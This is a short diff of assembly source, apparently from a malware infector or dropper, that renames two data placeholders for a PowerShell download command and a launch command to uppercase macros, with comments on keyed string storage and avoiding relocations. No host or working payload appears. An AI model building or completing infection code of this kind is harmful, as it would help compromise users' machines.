@@ -27,11 +27,11 @@ main:
 infection__data__start:         ; this prevents relocations from forming because we are not
                                 ; using absolute addresses for our data, making it more portable  
 infection__data__sheep:
-   launch_command               ; dd str_len
+   LAUNCH_COMMAND               ; dd str_len
    ;; db key
    ;; db string_data
 infection__data__powershell:
-   download_command             ; dd str_len
+   DOWNLOAD_COMMAND             ; dd str_len
    ;; db key
    ;; db string_data
 infection__data:
